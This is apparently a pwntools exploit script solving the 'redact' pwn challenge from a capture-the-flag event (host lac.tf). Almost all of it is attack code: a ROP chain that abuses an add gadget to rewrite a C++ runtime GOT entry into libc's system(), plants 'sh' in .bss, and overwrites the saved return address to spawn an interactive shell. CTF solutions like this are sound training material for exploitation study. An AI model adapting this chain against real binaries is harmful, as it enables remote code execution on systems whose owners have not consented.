#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./redact_patched')
libc = ELF('libc.so.6')
libcpp = ELF('libstdc++.so.6')

host = args.HOST or 'lac.tf'
port = int(args.PORT or 31281)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript,env={"LD_LIBRARY_PATH":"/home/paul/Downloads/lactf/pwn/redact"}, *a, **kw)
    else:
        return process([exe.path] + argv,env={"LD_LIBRARY_PATH":"/home/paul/Downloads/lactf/pwn/redact"}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+664
continue
'''.format(**locals())

# -- Exploit goes here --

gadget_add = 0x00000000004011e8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget_pops = 0x0000000000401610 # pop rbx ; pop r12 ; pop rbp ; ret
pop_rdi = 0x000000000040177b # pop rdi ; ret

def add_gadget(address, val):
    global gadget_add
    global gadget_pops
    return p64(gadget_pops)+p64(val & 0xffffffff)+p64(0)+p64(address+0x3d)+p64(gadget_add)

io = start()
io.sendlineafter(b'text: ',b'aa')

diff = libc.sym['system'] - (libcpp.sym['_ZNSt8ios_base4InitC1Ev'] + 0x1ef000)
payload = add_gadget(exe.got['_ZNSt8ios_base4InitC1Ev'], diff)
payload += add_gadget(exe.bss()+0X18, u32(b'sh\0\0'))
payload += p64(pop_rdi) + p64(exe.bss()+0x18)
payload += p64(exe.plt['_ZNSt8ios_base4InitC1Ev'])

io.sendlineafter(b'placeholder: ',payload)

# 72 is the index to write on saved_rip
io.sendlineafter(b'redact: ', b'72')

io.interactive()

